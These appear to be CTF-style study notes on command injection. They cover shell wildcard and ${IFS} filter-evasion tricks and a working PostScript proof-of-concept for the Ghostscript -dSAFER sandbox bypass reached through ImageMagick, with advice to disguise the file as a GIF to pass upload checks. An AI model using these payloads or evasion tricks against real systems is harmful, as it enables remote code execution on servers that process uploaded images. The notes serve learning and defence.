# Command injection
In CTF, we can directly cat flag with cmd injection. In real world, we can directly make a reverse shell with it.  
First, we can take a look at the power of wildcard...  
```php
// match one character
cat fla?
cat ./???sword

// match multiple character
cat f*

// bypass the limit on space character
cat${IFS}flag
cat$IFSflag
```

## ghostscript RCE
The sandbox `-dSAFER` of ghostscript has been bypassed! The sandbox is controlled by the `LockSafetyParams` param in the process, then `restore` of gs can overwrite the the param. Many application based on ghostscript would be influenced, such as the most famous application imageMagick. Following is the payload of POC.jpg:  
```php
%!PS
userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```  
Here, you can also forge it as gif with `gif89` header to deceive the file upload system.  
❗️ Attention: The timing to trigger the RCE is important.  

Others from `convert xxx.jpg xxx` can trigger the RCE, someone found that `less .jpg` can also trigger it. But why?  
```php
strace -f -o trace_result.txt less xxx.jpg

// one is suspicious
execve("/bin/sh", ["sh", "-c", "/usr/bin/lesspipe.sh xxx.jpg"], [/* 10 vars */]) = 0
```  
Then we can find something in the `lesspipe.sh`, it use `identify` command of ImageMagick to output the information of jpeg.
